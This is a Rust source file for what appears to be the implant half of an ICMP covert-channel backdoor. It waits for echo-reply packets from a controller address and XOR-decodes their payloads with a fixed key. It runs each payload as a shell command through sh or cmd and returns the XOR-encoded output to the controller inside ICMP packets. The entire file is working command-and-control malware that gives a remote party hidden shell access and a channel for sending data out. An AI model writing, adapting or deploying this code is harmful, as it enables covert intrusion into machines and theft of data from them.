use std::{net::Ipv4Addr, str::from_utf8};

use clap::Parser;
use icmp_socket::socket::IcmpSocket;
use icmp_socket::IcmpSocket4;
use icmp_socket::Icmpv4Message;
use icmp_socket::Icmpv4Packet;
use std::process::Command;

use functions::crypto::xor;

const CLIENT_IDENTIFIER: u16 = 0;
const SERVER_IDENTIFIER: u16 = 1;

const KEY: u8 = 65;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// IP address to listen for packets on
    #[arg(short, long)]
    address: Option<String>,
}

pub fn main() {
    let host_address = Args::parse().address.unwrap_or_else(|| {
        println!("No arguments provided. Setting default address as 127.0.0.1");

        "127.0.0.1".to_string()
    });

    let parsed_address = host_address.parse::<Ipv4Addr>().unwrap();
    let socket = IcmpSocket4::new();

    let Ok(mut socket) = socket else {
        println!("Error hooking socket: {:?}", socket.err().unwrap());
        return;
    };

    loop {
        let (packet, from_address) = match socket.rcv_from() {
            Ok(packet) => packet,
            Err(err) => {
                println!("PACKET LISTENING FAILED! {:?}", err);
                break;
            }
        };

        let address = *from_address.as_socket_ipv4().unwrap().ip();

        if address == parsed_address {
            if let Icmpv4Message::EchoReply {
                payload,
                identifier,
                ..
            } = packet.message
            {
                if identifier != SERVER_IDENTIFIER {
                    continue;
                }

                let decrypted_payload: Vec<u8> =
                    payload.iter().map(|byte| xor(*byte, KEY)).collect();

                let result = from_utf8(&decrypted_payload);

                let Ok(to_execute) = result else {
                    println!("Error parsing payload: {:?}", result.err().unwrap());
                    continue;
                };

                let output = match cfg!(target_os = "windows") {
                    true => Command::new("cmd")
                        .args(["/C", to_execute])
                        .output()
                        .expect("Failed to execute process"),
                    false => Command::new("sh")
                        .arg("-c")
                        .arg(to_execute)
                        .output()
                        .expect("Failed to execute process"),
                };

                let output = String::from_utf8_lossy(&output.stdout);

                println!("Command ran from {} - {} {}", address, to_execute, output);

                let encrypted_payload: Vec<u8> = output
                    .as_bytes()
                    .iter()
                    .map(|byte| xor(*byte, KEY))
                    .collect();

                let packet = Icmpv4Packet {
                    typ: 0,
                    code: 0,
                    checksum: 0,
                    message: Icmpv4Message::EchoReply {
                        identifier: CLIENT_IDENTIFIER,
                        sequence: 1,
                        payload: encrypted_payload,
                    },
                };

                if let Err(err) = socket.send_to(parsed_address, packet) {
                    println!("Error sending response: {:?}", err);
                }
            }
        }
    }
}
